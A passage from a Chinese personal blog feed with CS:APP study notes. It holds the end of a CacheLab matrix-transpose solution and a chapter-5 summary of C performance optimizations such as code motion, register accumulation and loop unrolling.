class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t1, t2, t3, t4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N / <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M / <span class="number">8</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (M == <span class="number">32</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; <span class="number">8</span>; ++r) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> s = <span class="number">0</span>; s &lt; <span class="number">8</span>; ++s) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (i == j &amp;&amp; r == s) &#123;</span><br><span class="line">                            t1 = r;</span><br><span class="line">                            t2 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + s];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            t3 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + s];</span><br><span class="line">                            B[j * <span class="number">8</span> + s][i * <span class="number">8</span> + r] = t3;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">                        B[j * <span class="number">8</span> + t1][i * <span class="number">8</span> + t1] = t2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//#1</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; <span class="number">4</span>; ++r) &#123;</span><br><span class="line">                    t1 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">0</span>];</span><br><span class="line">                    t2 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">                    t3 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">2</span>];</span><br><span class="line">                    t4 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">0</span>][i * <span class="number">8</span> + r] = t1;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">1</span>][i * <span class="number">8</span> + r] = t2;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">2</span>][i * <span class="number">8</span> + r] = t3;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">3</span>][i * <span class="number">8</span> + r] = t4;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//#2</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; <span class="number">4</span>; ++r) &#123;</span><br><span class="line">                    t1 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">4</span>];</span><br><span class="line">                    t2 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">5</span>];</span><br><span class="line">                    t3 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">6</span>];</span><br><span class="line">                    t4 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">4</span>][i * <span class="number">8</span> + r] = t1;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">5</span>][i * <span class="number">8</span> + r] = t2;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">6</span>][i * <span class="number">8</span> + r] = t3;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">7</span>][i * <span class="number">8</span> + r] = t4;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//#3</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">4</span>; r &lt; <span class="number">8</span>; ++r) &#123;</span><br><span class="line">                    t1 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">0</span>];</span><br><span class="line">                    t2 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">                    t3 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">2</span>];</span><br><span class="line">                    t4 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">0</span>][i * <span class="number">8</span> + r] = t1;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">1</span>][i * <span class="number">8</span> + r] = t2;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">2</span>][i * <span class="number">8</span> + r] = t3;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">3</span>][i * <span class="number">8</span> + r] = t4;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//#4</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">4</span>; r &lt; <span class="number">8</span>; ++r) &#123;</span><br><span class="line">                    t1 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">4</span>];</span><br><span class="line">                    t2 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">5</span>];</span><br><span class="line">                    t3 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">6</span>];</span><br><span class="line">                    t4 = A[i * <span class="number">8</span> + r][j * <span class="number">8</span> + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">4</span>][i * <span class="number">8</span> + r] = t1;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">5</span>][i * <span class="number">8</span> + r] = t2;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">6</span>][i * <span class="number">8</span> + r] = t3;</span><br><span class="line">                    B[j * <span class="number">8</span> + <span class="number">7</span>][i * <span class="number">8</span> + r] = t4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N / <span class="number">8</span> * <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M % <span class="number">8</span>; ++j) &#123;</span><br><span class="line">            B[M / <span class="number">8</span> * <span class="number">8</span> + j][i] = A[i][M / <span class="number">8</span> * <span class="number">8</span> + j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; ++j) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = N / <span class="number">8</span> * <span class="number">8</span>; i &lt; N; ++i) &#123;</span><br><span class="line">            B[j][i] = A[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这份代码得分为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           3.4         8        1699</span><br><span class="line">Trans perf 61x67           9.3        10        2067</span><br></pre></td></tr></table></figure><p>如果把分块从$8\times 8$在$61\times 67$的时候改为$16 \times 16$,那么$61\times 67$也可以得到满分，但是$64 \times 64$我还没发现拿满分的办法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CacheLab&quot;&gt;&lt;a href=&quot;#CacheLab&quot; class=&quot;headerlink&quot; title=&quot;CacheLab&quot;&gt;&lt;/a&gt;CacheLab&lt;/h1&gt;&lt;p&gt;这一章我们实战操作，编写一个模拟程序模拟存储器的缓存机制!&lt;/p&gt;
&lt;h2 id=&quot;实验目标
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP 第五章-总结</title>
    <link href="lengyu.me/2018/09/08/CS:APP%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%80%BB%E7%BB%93-2/"/>
    <id>lengyu.me/2018/09/08/CS:APP第五章-总结-2/</id>
    <published>2018-09-08T04:53:03.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="优化程序性能"><a href="#优化程序性能" class="headerlink" title="优化程序性能"></a>优化程序性能</h1><p>这一章因为没有对应的Lab,所以写一下总结防止自己遗忘,本章主要讲述了限制程序性能的一些因素以及如何去分析限制程序运行效率的因素和改进措施，解释了一些GCC对程序进行“非常小心”的优化的策略和为什么要“非常小心”的原因<br><strong>这一部分内容是根据CSAPP这本书第五章知识总结而成，可能到你见到这篇文章的时候GCC已经更新导致某些“魔术”不具有了实用价值，甚至于可能出现错误（也可能是我总结错误），发现了请及时和我联系</strong></p><h2 id="GCC的一些优化策略"><a href="#GCC的一些优化策略" class="headerlink" title="GCC的一些优化策略"></a>GCC的一些优化策略</h2><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>在前面我们知道，可以采用命令行选项 “-Og”掉用GCC让他只执行一些非常基本的优化，用选项”-O1”和”-O2”等让他们<br>使用更大量的优化。这样虽然可能会加快程序的运行效率，但是很有可能增大程序的规模，或者导致我们的<br>调试难以及进行。<br>编译器只会进行“安全的”优化，意思是说编译器”期望“不管什么情况下优化结果和原始代码运行<br>相同的情况下才可能进行优化，不希望因为优化导致程序运行错误。比如说这个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">twiddle1</span><span class="params">(<span class="keyword">long</span> *xp,<span class="keyword">long</span> *yp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *xp+=*yp;</span><br><span class="line">  *xp+=*yp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">twiddle2</span><span class="params">(<span class="keyword">long</span> *xp,<span class="keyword">long</span> *yp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *xp+=<span class="number">2</span>* *yp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数看起来似乎是一致的，而且因为第一个函数要进行6次内存引用，两次加法，第二个<br>函数只需要进行3次内存引用，一次乘法一次加法，我们可能会认为编译器会把第一种情况优化为<br>第二种情况，但是编译器不会这样做，因为如果当xp和yp指向同一块内存的时候，两个函数的运行结果<br>是不一样的，这就可能会导致优化的程序运行不符合我们的预期。所以不会进行这样的优化。<br>而看这个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">func1</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> f()+f()+f()+f();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>*f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看这两个函数应该也是一样的，但是如果f函数有副作用，比如f是下面这种形式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会导致func1和func2运行的不一致，而编译器去判断一个函数有没有副作用是比较困难的，所以<br>一般来说也不会进行这样的优化。</p><h3 id="改进措施"><a href="#改进措施" class="headerlink" title="改进措施"></a>改进措施</h3><p>对于twiddle1这种情况，应该由编写代码的人去判断是否有可能出现指向同一块区域，如果不存在这种<br>情况，应该由我们手动的改为twiddle2这种情况，而不能依靠GCC去帮我们实现。而对多次函数掉用<br>产生的开销，我们可以采用内联函数替换(inline substitution)，为了使用这个功能我们需要<br>在命令行中用”-finline”或者比”-O1”更高的优化等级才能开启，但这样也是有限制的，目前位置<br>GCC只会尝试在单个文件内进行内联替换，这就表明我们如果是调用库或其他的模块就不能使用这个功能<br>而且替换后的代码在进行调试的时候难度会上升</p><h2 id="程序编写时进行调整以期提高性能"><a href="#程序编写时进行调整以期提高性能" class="headerlink" title="程序编写时进行调整以期提高性能"></a>程序编写时进行调整以期提高性能</h2><h3 id="代码移动"><a href="#代码移动" class="headerlink" title="代码移动"></a>代码移动</h3><p>例如对于这样的结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  <span class="keyword">long</span> len;</span><br><span class="line">  <span class="keyword">data_t</span> *data;</span><br><span class="line">&#125;vec_rec,*vec_ptr;</span><br></pre></td></tr></table></figure><p>有这样的一些对应方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_vec_element</span><span class="params">(vec_ptr v,<span class="keyword">long</span> index, <span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(index&lt;<span class="number">0</span>||index&gt;=v-&gt;len)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *dest=v-&gt;data[index];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">vec_lenght</span><span class="params">(vec_ptr v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> vec-&gt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们通过define来定义OP和INDENT，那么如果我们考虑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INDENT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OP *</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine1</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  *dest=INDENT;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vec_lenght(v);++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">data_t</span> val;</span><br><span class="line">    get_vec_element(v,<span class="number">1</span>,&amp;val);</span><br><span class="line">    *dest=*dest OP val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析我们的代码发现其实vec的长度是不会有变化的，我们在每一次循环的时候都去掉用vec_lenght<br>增加了对内存的不必要引用，于是把vec_lenght写在循环外面可以比较有效的提高效率</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine1</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  *dest=INDENT;</span><br><span class="line">  <span class="keyword">long</span> lenght=vec_lenght(v);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;lenght;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">data_t</span> val;</span><br><span class="line">    get_vec_element(v,<span class="number">1</span>,&amp;val);</span><br><span class="line">    *dest=*dest OP val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特别的，如果vec_lenght不是$O(1)$而是$O(n)$或者其他的话，将其放在循环中甚至还会增加程序<br>的时间复杂度，比如如果vec_lenght是strlen的话，因为strlen是$O(n)$的，程序时间复杂度会显著增加</p><h3 id="减少过程掉用"><a href="#减少过程掉用" class="headerlink" title="减少过程掉用"></a>减少过程掉用</h3><p>事实上我们没必要每一次都去调用get_vec_element，虽然我们可能在其中做了一些比如边界检查<br>等操作，但是仔细分析我们这个循环，是不会利用到这些操作的，那么我们可以改写成这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">data_t</span> *get_vec_start(vec_ptr v)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> v-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine3</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  *dest=INDENT;</span><br><span class="line">  <span class="keyword">long</span> lenght=vec_lenght(v);</span><br><span class="line">  <span class="keyword">data_t</span> *data=get_vec_start(v);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;lenght;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    *dest=*dest OP data[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就减少了函数调用时的开销，虽然这一提升并不明显。</p><h3 id="消除不必要的内存引用"><a href="#消除不必要的内存引用" class="headerlink" title="消除不必要的内存引用"></a>消除不必要的内存引用</h3><p>事实上在上面的函数中我们将运算的中间过程存储在内存区域中，这样会频繁的去读写dest区域的数据，<br>这往往会导致程序性能受到影响，如果我们考虑将中间过程存储在寄存器中，程序的性能会有比较明显的提升</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine4</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">data_t</span> acc=INDET;</span><br><span class="line">  <span class="keyword">long</span> lenght=vec_lenght(v);</span><br><span class="line">  <span class="keyword">data_t</span> *data=get_vec_start(v);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;lenght;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    acc=acc OP data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  *dest=acc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而编译器之所以不自动的进行这个转化是因为如果dest指向了data中的一块区域，那么这两个函数的<br>结果是不一致的。</p><h2 id="利用现代处理器的特性进行优化"><a href="#利用现代处理器的特性进行优化" class="headerlink" title="利用现代处理器的特性进行优化"></a>利用现代处理器的特性进行优化</h2><p>这一部分主要是讲述了如何利用现代处理器的一些特性进行代码优化。举个例子，如果一个参考机<br>有8个功能单元，分别为0-7，那么每个单元的功能都是不同的:<br>0:整数运算、浮点乘法、整数和浮点除法、分支<br>1:整数运算、浮点加法、整数乘法、浮点乘法<br>2:加载、地址计算<br>3:加载、地址计算<br>4:存储<br>5:整数运算<br>6:整数运算、分支<br>7:存储地址运算<br>可以看到不同功能所有用的功能模块数量是不一样的，比如整数加法有四个模块，而浮点除法只有一个<br>模块，只有当充分利用这些模块的时候代码性能才会达到最优。<br>另一方面，现代处理器利用非常复杂的技术手段实现了乱序处理的功能，处理器不一定按照程序顺序<br>进行执行，可以乱序的执行一些操作，然后通过复杂的技术手段来保证程序在乱序执行下的结果是和<br>顺序执行一致的。<br>以combine4为例，其中循环部分汇编代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L25</span><br><span class="line">  vmulsd  (%rdx),%xmm0,%xmm0</span><br><span class="line">  addq  $8,%rdx</span><br><span class="line">  cmpq  %rax,%rdx</span><br><span class="line">  jne   .L25</span><br></pre></td></tr></table></figure><p>我们可以看到这段代码不断的从%rdx指向的地址处读入数据乘上%xmm0存入%xmm0,这就表明我们需要<br>等待上一次的%xmm0完成计算之后才能进行下一次%xmm0相关的计算，导致无法充分的利用处理器单元<br>为了优化这样的情况，可以采用循环展开技术</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><h4 id="k-1的循环展开"><a href="#k-1的循环展开" class="headerlink" title="k*1的循环展开"></a>k*1的循环展开</h4><p>我们还是考虑combine4的情况，因为每一次循环的时候我们都是只采取一次操作，这样就导致了较高<br>的循环开销，如果我们变换成这样的形式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine4</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">data_t</span> acc=INDET;</span><br><span class="line">  <span class="keyword">long</span> lenght=vec_lenght(v);</span><br><span class="line">  <span class="keyword">long</span> limit=lenght<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">data_t</span> *data=get_vec_start(v);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;limit;i=i+<span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    acc=(acc OP data[i]) OP data[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(;i&lt;lenght;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    acc=acc OP data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  *dest=acc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在每一次循环中我们进行了两次操作，将循环带来的开销降低了一半，类似的，如果在循环中<br>进行k次操作，就称之为k*1路循环展开。<br>事实上这个优化很容易实现，编译器优化选项开的足够高的话，GCC甚至会自动的帮我们完成</p><h4 id="k-k路循环展开"><a href="#k-k路循环展开" class="headerlink" title="k*k路循环展开"></a>k*k路循环展开</h4><p>前面的k*1路循环展开虽然降低了循环带来的额外开销，但是还是受限于在%xmm0这个寄存器上运算，没有充分<br>的利用处理器的所有运算单元，事实上如果我们考虑将奇数元素存储到acc1上，偶数元素存储到acc2上<br>这样写出如下的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine4</span><span class="params">(vec_ptr v,<span class="keyword">data_t</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">data_t</span> acc1=INDNT;</span><br><span class="line">  <span class="keyword">data_t</span> acc2=INDNT;</span><br><span class="line">  <span class="keyword">long</span> lenght=vec_lenght(v);</span><br><span class="line">  <span class="keyword">long</span> limit=lenght<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">data_t</span> *data=get_vec_start(v);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;limit;i=i+<span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    acc1=acc1 OP data[i];</span><br><span class="line">    acc2=acc2 OP data[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(;i&lt;lenght;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    acc1=acc1 OP data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  *dest=acc1 OP acc2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样acc1和acc2就存储到了不同的寄存器上，每一次循环的时候就并行的利用两个运算单元进行两次<br>乘法运算，提高了代码的并行性，程序的性能也会有显著的提升。这样利用k个寄存器进行并行运算<br>称为k*k路循环展开，一般来说，对于延迟为L的操作，如果处理器有C个对应的运算单元，在$k\geq L\times C$的时候<br>性能可以达到这种优化的最大值。</p><h4 id="重新结合变换"><a href="#重新结合变换" class="headerlink" title="重新结合变换"></a>重新结合变换</h4><p>类似于</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acc =(acc OP data[i]) OP data[i+<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这样的语句，如果变换成</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acc = acc OP (data[i] OP data[i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>的形式，成为2*1a循环展开，这样会使得程序性能有很大的提升，因为data[i]和data[i+1]的运算不依赖于<br>acc的值，因为处理器的乱序执行功能他甚至可能被先行的算出来等待后续的需求，使得程序性能有显著的提升。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总的来说，这一部分的优化都是立足于去使用更多的运算器运算单元，只有当使用了全部的运算单元的时候，<br>程序性能才会达到最大。通常，使用k*k路循环展开是非常有效的一种方式。</p><h3 id="一些限制因素"><a href="#一些限制因素" class="headerlink" title="一些限制因素"></a>一些限制因素</h3><h4 id="寄存器溢出"><a href="#寄存器溢出" class="headerlink" title="寄存器溢出"></a>寄存器溢出</h4><p>根据第三章的知识，如果使用的变量数超过了可用的寄存器数，就会在栈帧上开辟空间，这样又会去读写内存，导致程序<br>运行效率变低，所以同一函数内变量不应该太多（尽量在寄存器内完成操作）,比如循环展开k*k时k不能取得太大</p><h4 id="分支预测和预测错误处罚"><a href="#分支预测和预测错误处罚" class="headerlink" 